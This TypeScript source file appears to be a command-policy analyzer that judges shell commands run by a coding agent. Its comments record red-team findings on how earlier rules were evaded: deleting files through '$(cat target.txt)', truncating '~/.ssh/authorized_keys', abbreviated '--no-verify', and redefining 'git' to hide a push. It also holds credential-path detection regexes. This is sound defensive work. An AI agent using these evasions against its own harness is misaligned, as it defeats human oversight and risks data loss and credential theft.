      // target inside a protected tree opens a route into it, and a link SOURCE inside one opens a route out
      dest = 'ALL';
  }
  // a generic `-o FILE` / `--output FILE` names a write destination whatever the tool is called; enumerating every
  // "read-only" tool that happens to accept one is the losing game (round 15)
  // ...and an EXPLICIT output flag names a destination whatever the value looks like: `--outDir control-plane`
  // has neither a slash nor a dot, and this shape test rejected it (exit review 8)
  if (!dest && genericOutput && !/^-/.test(genericOutput)) dest = genericOutput;
  if (dest === 'ALL_PATHSPECS') {
    for (const sp of gitPathspecs) {
      if (paths.some((q) => q.raw === sp)) continue;
      const expanded = expandHome(sp);
      if (expanded === null || /[$`]/.test(expanded)) paths.push({ raw: sp, abs: null, glob: false });
      else {
        const glob = /[*?[{]/.test(expanded);
        const literal = glob ? expanded.slice(0, expanded.search(/[*?[{]/)) : expanded;
        paths.push({
          raw: sp,
          abs: canonicalPath(isAbsolute(literal) ? literal : resolve(cwd, literal)),
          glob,
        });
      }
    }
    dest = 'ALL';
  }
  if (dest && dest !== 'ALL' && dest !== 'AFTER_DASHDASH' && !paths.some((p) => p.raw === dest)) {
    const expanded = expandHome(dest);
    if (expanded === null || /[$`]/.test(expanded)) paths.push({ raw: dest, abs: null, glob: false });
    else {
      const glob = /[*?[{]/.test(expanded);
      const literal = glob ? expanded.slice(0, expanded.search(/[*?[{]/)) : expanded;
      paths.push({
        raw: dest,
        abs: canonicalPath(isAbsolute(literal) ? literal : resolve(cwd, literal)),
        glob,
      });
    }
  }
  if (dest === 'ALL') {
    for (const t of tokens.slice(1)) {
      if (t.startsWith('-') || paths.some((p) => p.raw === t) || /^[sy]\/|^\d+$/.test(t)) continue;
      const expanded = expandHome(t);
      if (expanded === null || /[$`]/.test(expanded)) continue;
      paths.push({
        raw: t,
        abs: canonicalPath(isAbsolute(expanded) ? expanded : resolve(cwd, expanded)),
        glob: /[*?[{]/.test(expanded),
      });
    }
  }
  if (dest === 'AFTER_DASHDASH') {
    for (const t of tokens.slice(tokens.indexOf('--') + 1)) {
      const expanded = expandHome(t);
      if (expanded === null || /[$`]/.test(expanded)) continue;
      paths.push({
        raw: t,
        abs: canonicalPath(isAbsolute(expanded) ? expanded : resolve(cwd, expanded)),
        glob: false,
      });
    }
  }
  // an implicit destination (archive extracted into the working directory) is a path the command never spells out
  if (dest === '.' && !paths.some((p) => p.raw === '.'))
    paths.push({ raw: '.', abs: canonicalPath(cwd), glob: false });
  // a recursive read names its roots as bare operands too (`cd / && grep -r KEY Users`): an operand that is HOME or one of
  // its ancestors reaches the credential stores
  if (recursive) {
    // the search PATTERN is data, not a root: `grep 'rm -rf /' notes.md` searches for that text (exit review 5)
    const patternAt =
      PATTERN_FIRST_HEADS.has(head) && !tokens.some((t) => /^-[a-zA-Z]*[ef]$/.test(t) || /^--(regexp|file)=/.test(t))
        ? tokens.findIndex((t, i) => i > 0 && !t.startsWith('-'))
        : -1;
    for (const [ti, t] of tokens.entries()) {
      if (ti === 0 || ti === patternAt || patternWords.includes(t)) continue;
      if (t.startsWith('-')) continue;
      const expanded = expandHome(t);
      if (expanded === null || /[$`*?[{]/.test(expanded)) continue;
      const abs = canonicalPath(isAbsolute(expanded) ? expanded : resolve(cwd, expanded))
        .split(sep)
        .join('/');
      if (abs === home || home.startsWith(abs.replace(/\/$/, '') + '/'))
        hits.push({
          capability: 'fs.credential-store.read',
          verdict: verdictFor(table, ctx, 'fs.credential-store.read'),
          via: `recursive read of ${t} reaches credential stores`,
          segment: seg,
          absolute: false,
        });
    }
  }
  // A DESTRUCTIVE VERB WHOSE TARGET CANNOT BE READ HAS AN UNKNOWN TARGET, AND AN UNKNOWN TARGET IS NOT THE
  // REPOSITORY. Every operand carrying a `$` or a backtick is skipped above, correctly — the analyzer cannot know
  // what it expands to — but the segment then fell through to the verb's own matcher, and `rm`'s matcher is the
  // ALLOW capability `fs.repo.delete`. So `rm -f $(cat target.txt)` and `X=/etc/passwd; rm -f $X` removed any file
  // on the machine at ALLOW while `rm -f /etc/passwd` was DENY: the laundering was the whole exploit
  // (exit review 7). Naming the opacity is what the analyzer can honestly say here.
  // THE DERIVED-DIRECTORY ALLOWANCE RESTS ON THE NAME DENOTING DERIVED CONTENT, and a rename or a symlink
  // earlier in the SAME command breaks that: `mv docs dist && rm -rf dist` and `ln -s docs dist && rm -rf dist/`
  // delete the documentation through a name the policy calls regenerable (exit review 8). The write ledger
  // already knows the name was just created, so the allowance simply does not apply to it.
  if (/^(rm|rmdir|unlink)$/.test(head))
    for (const t of tokens.slice(1)) {
      if (t.startsWith('-')) continue;
      const abs = canonicalPath(isAbsolute(t) ? t : resolve(cwd, t.replace(/\/$/, '')));
      if (!written.has(abs) && !written.has('\0any')) continue;
      hits.push({
        capability: 'command.unknown',
        verdict: verdictFor(table, ctx, 'command.unknown'),
        via: `${t} was created or replaced earlier in this command, so what it names now is not what the name says`,
        segment: seg,
        absolute: false,
      });
    }
  if (DESTRUCTIVE_HEADS.has(head)) {
    const opaque = tokens.slice(1).filter((t) => !t.startsWith('-') && /[$`]/.test(t));
    for (const t of opaque)
      hits.push({
        capability: 'command.unknown',
        verdict: verdictFor(table, ctx, 'command.unknown'),
        via: `${head} target ${t} is not readable, so the path it names is unknown`,
        segment: seg,
        absolute: false,
      });
  }
  if (containerPaths || paths.length === 0) return hits;
  for (const p of paths) {
    if (p.abs === null) {
      hits.push({
        capability: 'command.unknown',
        verdict: verdictFor(table, ctx, 'command.unknown'),
        via: `dynamic path ${p.raw}`,
        segment: seg,
        absolute: false,
      });
      continue;
    }
    const posix = p.abs.split(sep).join('/');
    // A glob that expands into the EGO_HOME trust store (`~/.ego/*`, `~/.ego/trust*`, `~/.ego/trus[t]`) or a recursive
    // op over the store's parent (`cp -r ~/.ego …`, `rm -rf ~/.ego`) tampers with / exfiltrates the trust material,
    // which the strict-descendant check misses. The literal prefix is recomputed from the raw token (dest='ALL' and
    // recursive loops store the un-truncated glob in p.abs).
    if (ctx.egoHome) {
      const egoPosix = canonicalPath(ctx.egoHome).split(sep).join('/');
      const expandedRaw = expandHome(p.raw);
      if (expandedRaw !== null) {
        const rawGlob = /[*?[{]/.test(expandedRaw);
        const lit = rawGlob ? expandedRaw.slice(0, expandedRaw.search(/[*?[{]/)) : expandedRaw;
        const litPosix = canonicalPath(isAbsolute(lit) ? lit : resolve(cwd, lit))
          .split(sep)
          .join('/');
        // mv/rename relocate a whole directory tree without a recursive flag, so moving EGO_HOME (or a trust dir) away
        // is a whole-tree op even though `recursive` is false for them
        const wholeTree =
          recursive || head === 'mv' || head === 'rename' || head === 'rm' || head === 'rmdir' || head === 'shred';
        if (reachesTrustStore(litPosix, egoPosix, rawGlob, wholeTree))
          hits.push({
            capability: 'ego.trust.tamper',
            verdict: verdictFor(table, ctx, 'ego.trust.tamper'),
            via: `EGO_HOME trust store (${rawGlob ? 'glob' : recursive ? 'recursive' : 'path'} ${p.raw})`,
            segment: seg,
            absolute: true,
          });
      }
    }
    const isDest =
      dest === 'ALL' ||
      (dest === 'AFTER_DASHDASH' && tokens.indexOf(p.raw) > tokens.indexOf('--')) ||
      (dest !== null && p.raw === dest);
    // reads: credential stores (any spelling, canonicalized), env files; recursive reads of HOME or `/` reach them too
    if (!write || !isDest) {
      const r = classifyPath(table, ctx, 'Read', p.abs);
      // `fs.outside-workspace.read` was dropped here, so the `Read` TOOL asked about a file outside the checkout
      // while `cat` of the same file was ALLOW — the same effect judged differently by the surface that carried
      // it (decision challenge, finding 18).
      if (
        r.via.startsWith('matcher path') ||
        r.capability.startsWith('fs.credential') ||
        (r.capability === 'fs.outside-workspace.read' && !isDevPath(p.abs))
      )
        hits.push({ ...r, via: `path argument ${p.raw} (${r.via})`, segment: seg });
      // a glob whose literal part is an ancestor of HOME (`/U*/me/.ssh/id_rsa`) can expand into a credential store too
      if (
        p.glob &&
        home.startsWith(posix) &&
        /(^|\/)\.([A-Za-z-]{0,16}[*?[{]|ssh|aws|kube|gnupg|azure|docker|netrc|npmrc|pypirc|git-credentials|config)/i.test(
          p.raw,
        )
      )
        hits.push({
          capability: 'fs.credential-store.read',
          verdict: verdictFor(table, ctx, 'fs.credential-store.read'),
          via: `glob ${p.raw} can expand into a credential store`,
          segment: seg,
          absolute: false,
        });
      if (p.glob && globCouldReachCredentials(p.abs))
        hits.push({
          capability: 'fs.credential-store.read',
          verdict: verdictFor(table, ctx, 'fs.credential-store.read'),
          via: `glob ${p.raw} can expand into a credential store`,
          segment: seg,
          absolute: false,
        });
      if (recursive && (posix === home || home.startsWith(posix + '/') || posix === '/'))
        hits.push({
          capability: 'fs.credential-store.read',
          verdict: verdictFor(table, ctx, 'fs.credential-store.read'),
          via: `recursive read of ${p.raw} reaches credential stores`,
          segment: seg,
          absolute: false,
        });
    }
    if (write && isDest) {
      if (p.glob) {
        hits.push({
          capability: 'command.unknown',
          verdict: verdictFor(table, ctx, 'command.unknown'),
          via: `glob destination ${p.raw}`,
          segment: seg,
          absolute: false,
        });
        continue;
      }
      // a device sink is a DISCARD, not a destination — the redirection form has always known this
      // a device is a DISCARD, but a raw block device is a disk and a `/dev/tcp` path is a socket: neither is
      const w = isDevPath(p.raw) && isDeviceDiscard(p.raw)
        ? { verdict: 'ALLOW' as const, via: '', capability: '', absolute: false }
        : classifyPath(table, ctx, 'Write', p.abs);
      if (w.verdict !== 'ALLOW')
        hits.push({ ...w, via: `write destination ${p.raw} (${w.via})`, segment: seg });
      // a destination directory that contains a protected path (copying a tree over .harness/, extracting into it)
      // is the protected write; extracting an archive whose contents the kernel cannot see into an ancestor of a
      // protected path (the repository root) is opaque
      const isArchive = head === 'tar' || head === 'bsdtar' || head === 'gtar' || head === 'unzip';
      const roots = [...ctx.repoRoots, ...(ctx.cwd ? [ctx.cwd] : [])].map((r) =>
        canonicalPath(r).split(sep).join('/'),
      );
      let direct: (typeof table.protectedPaths)[number] | null = null; // the destination IS a protected directory
      let contains: (typeof table.protectedPaths)[number] | null = null; // the destination contains one deeper down
      for (const pp of table.protectedPaths) {
        if (pp.tool === 'Read') continue;
        const prefix = pp.path
          .replace(/^\*\*\//, '')
          .replace(/^~\//, home + '/')
          .split(/[*?[{]/)[0]!
          .replace(/\/$/, '');
        // compared on the FOLDED name, because that is what the filesystem resolves: `mv .harnesſ /tmp/gone`
        // relocates the governance tree on macOS, and a raw string compare read it as a different directory
        // (exit review 8)
        const candidates = (isAbsolute(prefix) ? [prefix] : roots.map((r) => `${r}/${prefix}`)).map(foldName);
        const here = foldName(posix);
        if (candidates.some((c) => c === here)) {
          direct = pp;
          break;
        }
        if (!contains && candidates.some((c) => c.startsWith(here + '/'))) contains = pp;
      }
      // WRITING ONE NAMED FILE INTO THE REPOSITORY ROOT IS NOT A WRITE OF THE REPOSITORY'S PROTECTED SUBTREES.
      // The `contains` rule is what catches a write into `.harness` itself — the protected paths name the files
      // BELOW it, so there is no `direct` match for the directory — and it must keep doing that. What it must
      // not do is fire for a destination that is the ROOT, where "contains a protected path" is true of every
      // checkout: `cp /tmp/foo.txt .` was an ABSOLUTE core deny, the single most ordinary shell command there is
      // (exit review 7). At the root the rule applies only to a write nobody can enumerate.
      const atRoot = roots.includes(posix);
      const unenumerable = isArchive || writesUnenumerably(seg) || recursive;
      // A DELETE IS NOT A WRITE INTO. The `contains` rule exists to catch content PUT somewhere protected; a
      // removal puts nothing there, and its own destructive class already asks. `rm -rf node_modules` — the most
      // routine recovery command in JavaScript development — was refused outright because `node_modules/.bin`
      // is a protected path below it (exit review 7). Removing the protected path ITSELF is still `direct`.
      // A DELETE IS NOT A WRITE INTO — except of EGO's own governance tree, where removing the directory IS the
      // tamper. `rm -rf node_modules` — the most routine recovery command in JavaScript development — was
      // refused outright because `node_modules/.bin` is a protected WRITE path below it, while deleting `.bin`
      // installs no program (exit review 7). `rm -rf .harness` destroys the governance tree and stays denied.
      const removes = /^(rm|rmdir|unlink|shred)$/.test(head);
      const keep = removes ? (contains?.capability.startsWith('ego.') ? contains : null) : contains;
      const pp = direct ?? (atRoot && !unenumerable && !removes ? null : keep);
      if (pp) {
        if (isArchive && !direct) {
          // an archive whose contents the kernel cannot see, extracted into a directory that contains protected paths
          hits.push({
            capability: 'command.archive-extract',
            verdict: verdictFor(table, ctx, 'command.archive-extract'),
            via: `archive extracted into ${p.raw}, which contains protected ${pp.path}`,
            segment: seg,
            absolute: false,
          });
        } else {
          hits.push({
            capability: pp.capability,
            verdict: verdictFor(table, ctx, pp.capability),
            via: `write into ${p.raw}, which ${direct ? 'is' : 'contains'} protected ${pp.path}`,
            segment: seg,
            absolute: isAbsoluteCap(table, pp.capability),
          });
        }
      }
    }
  }
  return hits;
}

/** Whether a command string is a `git commit` with a hook-bypass flag (--no-verify, or a short-flag cluster
 *  containing `n`: -n/-nm/-nam/-vnm). Quote-aware: a `-n` inside the quoted -m/-F message is never a false positive. */
function commitBypassFlag(cmdStr: string): boolean {
  const m = tokenizeMarked(cmdStr);
  const gi = m.findIndex((t) => !t.quoted && t.text.slice(t.text.lastIndexOf('/') + 1) === 'git');
  if (gi < 0) return false;
  const ci = m.findIndex((t, i) => i > gi && !t.quoted && t.text === 'commit');
  if (ci < 0) return false;
  // A short-flag cluster carries --no-verify iff `n` appears before any letter that consumes the rest as a value
  // (`m`/`F` take the message/file). So `-nm`/`-nam`/`-vnm` bypass; `-mn`/`-mfoo` are just a `-m` message.
  const clusterNoVerify = (tok: string): boolean => {
    if (!/^-[A-Za-z]+$/.test(tok)) return false;
    for (const ch of tok.slice(1)) {
      if (ch === 'n') return true;
      if (ch === 'm' || ch === 'F') return false;
    }
    return false;
  };
  // git accepts any UNAMBIGUOUS abbreviation of a long option, so `--no-verif` disables the hooks exactly like
  // `--no-verify`. Accepting every prefix is fail-closed: an ambiguous one makes git error out, never bypass.
  const abbreviatedNoVerify = (tok: string): boolean =>
    tok.length >= 6 && '--no-verify'.startsWith(tok);
  for (let k = ci + 1; k < m.length; k++) {
    const prev = m[k - 1]!;
    // a message/file flag consumes the NEXT token as its value, so that token is data, not a flag — skip it. This
    // includes a short-flag cluster ENDING in `m`/`F` (`-am`, `-nm`, `-qm`): the trailing m/F takes the next token as
    // the message. (The introducer must be unquoted; a quoted `"-m"` is not one. A `-nm` bypass is already caught at
    // the `-nm` token itself before its message is reached.)
    if (
      !prev.quoted &&
      (/^(--message|--file|--reuse-message|--reedit-message|-C|-c)$/.test(prev.text) ||
        /^-[A-Za-z]*[mF]$/.test(prev.text))
    )
      continue;
    // the token's own quotes are already stripped (the shell strips `"-n"`/`-"n"`/`-n"m"` to `-n`/`-nm`). Model the
    // remaining reconstruction tricks: `$IFS`/`${IFS}` field-split the word, and `$""`/`$''`/`$VAR` empty-expand away —
    // so `-n$IFS-m`, `-n${IFS}`, `-n$""` all reduce to a bare `-n` before git parses it.
    // any $-expansion inside a git-commit flag token can field-split ($IFS) or, for an unset/empty variable, VANISH and
    // glue the literal fragments (`-${x}-no-verify` -> `--no-verify`, `-${x}n` -> `-n`). Default-value forms substitute
    // their literal word. Test BOTH a separator substitution and an empty substitution for the residual expansions.
    // A command substitution reaches here as the `$SUBST` marker the segment splitter leaves behind. In a flag
    // position it can expand to anything, including `-n`, so it fails closed. (A substitution used as a message or
    // file VALUE was already skipped above, so `git commit -m "$(date)"` stays allowed.)
    if (m[k]!.text.includes('$SUBST') || /\$\(|`/.test(m[k]!.text)) return true;
    const base = m[k]!.text
      .replace(/\$\{IFS[^}]*\}|\$IFS/g, ' ') // IFS-based expansions always field-split
      .replace(/\$\{[A-Za-z_][A-Za-z0-9_]*:?[-=+?]([^}]*)\}/g, '$1'); // ${x:-D}/${x:=D}/${x-D}/${x:+A} -> the literal word
    const residual = /\$\{[^}]*\}|\$[A-Za-z_][A-Za-z0-9_]*|\$[-@*#?!0-9]|\$/g;
    for (const sub of [' ', '']) {
      for (const part of base.replace(residual, sub).split(/\s+/)) {
        if (part === '--no-verify' || abbreviatedNoVerify(part) || clusterNoVerify(part)) return true;
      }
    }
  }
  return false;
}

/** The command strings carried in a quoted `env -S`/`--split-string`/`-c` value, whose inner quoting is preserved so a
 *  carried `git commit` can be scanned the same way as a top-level one. */
function carrierCommandValues(seg: string): string[] {
  const m = tokenizeMarked(seg);
  const out: string[] = [];
  for (let i = 0; i < m.length; i++) {
    const t = m[i]!.text;
    if ((t === '-c' || t === '-S' || t === '--split-string') && m[i + 1]) out.push(m[i + 1]!.text);
    else if (t.startsWith('--split-string=')) out.push(t.slice('--split-string='.length));
    else if (t.startsWith('-S') && t.length > 2 && !t.startsWith('--')) out.push(t.slice(2));
  }
  return out;
}

/** Every command string this segment CARRIES: `sh -c BODY`, `env -S BODY`, `trap BODY SIG`, `sh <<< BODY`. The
 *  normalizer already expands each of them — but it returns normalized STRINGS, which projects a pipeline EDGE
 *  away, so `sh -c "echo 'rm -rf /' | bash"` lost the very relation that makes it an execution (exit review 4).
 *  A body that contains an edge re-enters the canonical analyzer whole. */
function carriedShellBodies(seg: string): string[] {
  const out = [...carrierCommandValues(seg)];
  const t = tokenize(seg);
  const head = (t[0] ?? '').replace(/^.*\//, '');
  if (head === 'trap' && t[1] !== undefined && !t[1].startsWith('-')) out.push(t[1]);
  const here = t.indexOf('<<<');
  if (here >= 0 && t[here + 1] !== undefined) out.push(t[here + 1]!);
  return out;
}

/** AWK FORKS A SHELL, and the command it forks is a string EXPRESSION: `system("CMD")`, `print … | "CMD"` and
 *  `"CMD" | getline`. When that expression is a LITERAL — written inline, or held in a variable the same program
 *  assigns a literal to — the command is KNOWN, and reporting only opacity left a `git push origin main` at ASK
 *  where the same text anywhere else is an organization-locked deny (exit review 7).
 *
 *  Separate from `carriedShellBodies` because these bodies have no other route into the analyzer: the normalizer
 *  reaches a `trap` or a herestring body on its own, and it has no path for an awk program at all. */
function awkShellCommands(seg: string): string[] {
  const t = tokenize(seg);
  // THE HEAD IS FOUND WHERE THE COMMAND STARTS, not at token 0: `FOO=bar awk …` and `command awk …` are the same
  // awk invocation, and anchoring at position 0 missed both (exit review 7, cross-product).
  let i = 0;
  while (i < t.length) {
    const w = t[i]!;
    if (
      /^[A-Za-z_][A-Za-z0-9_]*=/.test(w) ||
      WRAPPERS.has(w) ||
      PREFIX_KEYWORDS.has(w) ||
      /^(timeout|sudo|doas|xargs|--)$/.test(w)
    ) {
      i++;
      // a wrapper's own operands: `nice -n 5`, `timeout 60`, `exec -c -a NAME`
      while (i < t.length && /^(-|\d)/.test(t[i]!)) {
        const opt = t[i]!;
        i++;
        if (/^(-n|-a|-C|-u|-g|-p|-t)$/.test(opt) && i < t.length && !t[i]!.startsWith('-')) i++;
      }
      continue;
    }
    break;
  }
  const head = (t[i] ?? '').replace(/^.*\//, '');
  if (!/^(awk|gawk|mawk|nawk)$/.test(head)) return [];
  const out: string[] = [];
  const program = t.slice(i + 1).filter((x) => !x.startsWith('-')).join(' ');
  const literals = new Map<string, string>();
  for (const m of program.matchAll(/([A-Za-z_]\w*)\s*=\s*"((?:[^"\\]|\\.)*)"/g)) literals.set(m[1]!, m[2]!);
  for (const m of program.matchAll(/\bsystem\s*\(\s*"((?:[^"\\]|\\.)*)"\s*\)/g)) out.push(m[1]!);
  for (const m of program.matchAll(/\|\s*&?\s*"((?:[^"\\]|\\.)*)"/g)) out.push(m[1]!);
  for (const m of program.matchAll(/"((?:[^"\\]|\\.)*)"\s*\|\s*&?\s*getline/g)) out.push(m[1]!);
  // `print … | VAR` and `system(VAR)`: the variable's literal value is the command
  for (const m of program.matchAll(/(?:\|\s*&?\s*|\bsystem\s*\(\s*)([A-Za-z_]\w*)\b/g)) {
    const v = literals.get(m[1]!);
    if (v !== undefined) out.push(v);
  }
  return out;
}

/** The command line `kubectl exec pod -- CMD …` and its neighbours carry after the separator. Against a LOCAL
 *  cluster the verb kept its ALLOW while that command was never analysed at all (exit review 3), so it is fed
 *  back into the canonical pipeline as its own segment. */
function execCarriedCommand(seg: string): string | null {
  const t = tokenize(seg);
  const head = t[0] ?? '';
  if (!/^(kubectl|oc|docker|podman|nerdctl)$/.test(head)) return null;
  if (!t.some((x) => /^(exec|attach|debug)$/.test(x))) return null;
  const dd = t.indexOf('--');
  // RE-QUOTED, because the carried command is handed back as TEXT and `join(' ')` is not the inverse of
  // `tokenize`: an awk program or a `-c` body carried after the separator is one word, and joining the tokens
  // erased the quoting that said so (exit review 7, cross-product).
  return dd >= 0 && dd + 1 < t.length ? requote(t.slice(dd + 1)) : null;
}

/** THE canonical semantic-analysis pipeline.
 *
 *  Invariant (product decision, 2026-09-22): the same semantic action receives the same security analysis whether it
 *  appears at top level, inside a Makefile recipe, inside a package script, inside a shell script or behind any other
 *  supported producer. Nested analysis may ADD context; it may never lose a protection that applies at top level.
 *
 *  Both entry points delegate here: `classifyCommand` for a host tool call, and the effect recursion in
 *  `classifyNormalized` for a resolved producer body. Before this existed the recursion re-entered a SUB-layer
 *  (matchers only), so a nested effect was analysed strictly more weakly than the identical text at top level —
 *  `echo x > $EGO_HOME/trust/keys` was an absolute deny at top level and an ALLOW inside a make recipe.
 *
 *  Recursion is bounded by `state.depth` (truncation is opaque, never the parent's class) and by `state.seen`, which
 *  keys on execution identity (directory + target), not on a bare name. */
function analyzeSegments(
  table: CompiledAuthorityTable,
  ctx: EvaluationContext,
  compiled: Array<{ m: CompiledMatcher; re: RegExp }>,
  segments: string[],
  state: EffectState,
  /** true when each segment runs in its OWN shell, so a `cd` must not leak to the next one. GNU make starts a shell
   *  per recipe line, and npm runs pre/main/post as separate processes (challenge 4, findings 4, 19, 26, 33). */
  isolatedShells = false,
): CapabilityHit[] {
  const hits: CapabilityHit[] = [];
  // THE SECOND LOCK ON MARKER FORGERY. Every string that reaches this function came from OUTSIDE the analyzer —
  // the tool's command, a carried shell body, a literal piped into an interpreter, a script line, a make recipe,
  // a manifest script, a hook body — and the markers are injected BELOW this point, by `splitShellPipeline` and
  // `normalizeSegment`. So mangling the sentinel here cannot destroy a real marker, and it makes a forged one
  // (`\0ego\0define-function git; git push origin main`) into what it actually is: an unknown command.
  segments = segments.map(externalText);
  // TRANSITIVE FRESHNESS: the ledger belongs to the COMMAND, not to one producer, and is mutated in place. A copy
  // here is what made `./configure && make build` reuse the Makefile configure had just rewritten — the write
  // happened one level down and never came back out (challenge 6, findings 6, 13, 19).
  const written = state.env.written;
  // A body can REDEFINE a name for everything after it: a shell function, an alias, or a standalone assignment of
  // an execution input. These failed safe only because the defining line itself was unclassified — an accident,
  // not a property. The redefinition accumulates across the unit exactly like the write ledger, and resets per
  // isolated shell, because a make recipe line and an npm pre/post script are separate processes.
  let carriedEnv: Record<string, string> = {};
  let rebound: string | null = null;
  // A FUNCTION OR ALIAS REBINDS THE NAME IT DECLARES, NOT EVERY NAME. Marking the whole unit redefined made an
  // ordinary `build() { ls; }` — and every script that defines a helper — opaque, while the case the rule exists
  // for is `tsc() { git push …; }` FOLLOWED BY `tsc -p .`, where the name really is used (exit review 4). A
  // lookup-path rebind (`PATH=…`) stays global, because it re-points every later command.
  const definedNames = new Map<string, string>();
  /** names DEFINED AS FUNCTIONS in this unit: their bodies are handed over at the definition, so a call to one
   *  adds no closure. An `alias` body is NOT handed over and keeps its binding gap. */
  const functionNames = new Set<string>();
  const startCwd = state.env.cwdVerified ? state.env.cwd : '\0dynamic';
  let cwd = startCwd;
  // each UNIT is one shell invocation; `cd a && b` inside a unit still moves the directory for `b`
  // EVERY unit is split into the commands it runs, HERE, whatever the isolation. A producer's contract is to
  // resolve WHICH lines execute and hand them over verbatim — `scriptSegments` emits whole lines — so turning a
  // line into commands is the analyzer's job. Splitting only the isolated shells meant a script body's line was
  // classified as its FIRST command alone: `echo "$(git push origin main)"` in a `.sh` was an `echo`, and so was
  // `echo start; git push origin main`. Isolation decides whether shell state RESETS between units, nothing else.
  // A NON-ISOLATED UNIT IS ONE SHELL, SO IT IS SPLIT ONCE, WHOLE. Splitting a script body line by line reset the
  // splitter's cross-line state, and a `case` construct whose branches sit below `case "$1" in` kept its pattern
  // glued to the command — the multi-line spelling of the defect exit review 4 found on one line. Make recipe
  // lines and npm pre/post scripts ARE separate shells, and keep their per-line split.
  const units = isolatedShells
    ? segments.map((u) => splitShellPipeline(u))
    : [splitShellPipeline(segments.join('\n'))];
  for (const unit of units) {
    if (isolatedShells) {
      cwd = startCwd; // a fresh shell per recipe line / per pre|main|post script
      carriedEnv = {};
      rebound = null;
      definedNames.clear();
      functionNames.clear();
    }
    // A DEFINITION THE SHELL MAY NEVER EXECUTE BINDS NOTHING. `if false; then git() { echo hi; }; fi` does not
    // define `git`, and neither does a definition inside a `while`/`until`/`for`/`case` branch or one that is a
    // PIPELINE stage, since every stage runs in its own subshell. The analyzer recorded the name anyway, and the
    // real `git push origin main` that followed was classified as a call to a known local function — read-only,
    // ALLOW, through an organization-locked deny and through absolute core denies for psql and the cloud CLIs
    // (exit review 8). A binding is trusted only where it is UNCONDITIONAL.
    let condDepth = 0;
    const stages = unit;
    // the stage whose standard output the NEXT piped stage will read. A GROUP writes the CONCATENATION of what
    // its commands write, so this is a LIST: `{ echo 'git push origin main'; echo ls; } | sh` feeds the shell
    // both lines, and keeping only the last stage lost the first (exit review 7).
    let upstream: string | null = null;
    let upstreamParts: string[] = [];
    let upstreamGroup: number | undefined;
    let upstreamBody: { body: string; expanded: boolean } | null = null;
    for (const [stageIndex, stage] of stages.entries()) {
    const seg = stage.text;
    // `if`/`while`/`until`/`for`/`case` open a branch whose body may not run; `fi`/`done`/`esac` close it
    const kw = /^(if|while|until|for|case|select)\b/.exec(seg.trim());
    const kwEnd = /^(fi|done|esac)\b/.test(seg.trim());
    // A stage that FEEDS a pipe, or is fed by one, runs in its own subshell. For a function DEFINITION the pipe
    // is attached to the stage after the whole BODY — `git() { echo hi; } | cat` puts it on `cat` — so the look
    // ahead skips the body's group before asking.
    let after = stageIndex + 1;
    while (stages[after]?.groupId !== undefined) after++;
    const inPipeline = stage.pipedFromPrevious === true || stages[after]?.pipedFromPrevious === true;
    const bindingIsProven = condDepth === 0 && !inPipeline;
    if (kw) condDepth++;
    else if (kwEnd) condDepth = Math.max(0, condDepth - 1);
    const stdinFrom = stage.pipedFromPrevious ? upstream : null;
    const stdinParts = stage.pipedFromPrevious ? upstreamParts : [];
    const upstreamHeredoc = stage.pipedFromPrevious ? upstreamBody : null;
    const hitsBefore = hits.length;
    // `cd DIR` moves the working directory for the following segments (a dynamic target makes it unknown). Options
    // and `--` are skipped (`cd -- .harness/generated`, `cd -P dir`), and the directory is the last positional.
    const cdTrimmed = seg.trim();
    // The subshell's working directory is RESTORED here, and a restore is state rather than a command: classifying
    // the marker made every ordinary `( cd docs && ls )` ask as an unknown command (exit review 4).
    if (cdTrimmed === SUBSHELL_CWD_RESTORE) {
      cwd = '\0dynamic';
      continue;
    }
    if (cdTrimmed === HEREDOC_UNTERMINATED) {
      hits.push(
        opaqueHit(table, ctx, seg, 'a heredoc delimiter never arrived, so the rest of this command was read as its body'),
      );
      continue;
    }
    // a consumed function header binds a name for everything after it, and is not a command
    if (cdTrimmed.startsWith(`${FUNCTION_DEF_PREFIX} `)) {
      if (bindingIsProven) functionNames.add(cdTrimmed.slice(FUNCTION_DEF_PREFIX.length + 1));
      continue;
    }
    const cdTokens = /^(?:cd|pushd)(?:\s|$)/.test(cdTrimmed) ? tokenize(cdTrimmed).slice(1) : null;
    const cdArgs = cdTokens ? cdTokens.filter((a) => a !== '--' && !a.startsWith('-')) : null;
    if (cdArgs && cdArgs.length) {
      const target = expandHome(cdArgs[cdArgs.length - 1]!);
      const base = cwd === '\0dynamic' ? state.env.cwd : cwd;
      const logical = target === null ? null : isAbsolute(target) ? target : resolve(base, target);
      let resolvedCd = target === null || /[$`*?]/.test(target) ? null : canonicalPath(logical!);
      // `cd` is LOGICAL by default and PHYSICAL under -P: after a symlinked component, a `..` segment goes to two
      // different directories. EGO resolves physically, so where the two disagree the context is not proven and
      // every relative conclusion below it is downgraded rather than asserted (challenge 5, finding 19).
      if (
        resolvedCd !== null &&
        logical !== null &&
        /(^|\/)\.\.(\/|$)/.test(target!) &&
        !cdTokens!.some((t) => /^-[a-zA-Z]*P/.test(t)) &&
        resolve(logical) !== resolvedCd
      )
        resolvedCd = null;
      // NOTE on a `cd` into a directory that does not exist (challenge 4, finding 3): with `&&` the cd failing
      // means nothing after it runs, so assuming it succeeded is safe; with `;` the rest runs in the ORIGINAL
      // directory, which EGO would then misattribute. Distinguishing them needs the separator, which segment
      // splitting discards. Requiring the directory to exist was tried and rejected: it broke `mkdir -p x && cd x`
      // and every `cd src && …` in a checkout EGO has not materialised. Recorded as a residual limitation rather
      // than fixed by making ordinary development ask.
      cwd = resolvedCd ?? '\0dynamic';
      if (cwd === '\0dynamic')
        hits.push({
          capability: 'command.unknown',
          verdict: verdictFor(table, ctx, 'command.unknown'),
          via: resolvedCd === null ? 'cd to a dynamic directory' : `cd to ${resolvedCd}, which does not exist`,
          segment: seg,
          absolute: false,
        });
      // NO `continue` HERE, and none may be added (challenge 5, finding 1). Recognising a segment's HEAD must never
      // remove that segment from the rest of the pipeline: `cd . > ~/.ssh/authorized_keys` truncates the file, and
      // while this branch skipped ahead the redirection scan below never saw it, so an absolute core deny reached
      // ALLOW. Tracking the directory is a side effect of walking the segment, never a substitute for analysing it.
      // `cd`/`pushd`/`popd` with no redirection are classified as read-only shell structure by matchers.md.
    }
    // `git commit` hook bypass: --no-verify, or a short-flag cluster containing `n` (`-n`, `-nm`, `-nam`, `-vn`).
    // Scanned on quote-aware tokens so a `-n` inside the `-m` message (a quoted token) is never a false positive. The
    // command carried in a quoted `env -S`/`--split-string`/`bash|sh -c` value is scanned too (its inner quoting is
